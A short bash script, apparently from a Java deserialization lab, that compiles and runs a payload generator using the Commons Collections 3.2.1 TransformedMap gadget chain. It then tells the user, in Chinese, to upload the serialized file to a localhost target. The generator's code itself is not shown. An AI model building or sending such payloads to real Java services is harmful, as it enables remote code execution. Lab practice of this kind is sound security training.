#!/bin/bash
# class13 — TransformedMap
cd "$(dirname "$0")"
javac -cp "../lib/commons-collections-3.2.1.jar" GenPayload.java -d .
java -cp ".:../lib/commons-collections-3.2.1.jar" class13.GenPayload
rm -rf class13
mv *.ser .. 2>/dev/null
echo "🎯 上传 class13.ser 到 http://localhost:81/class13/"
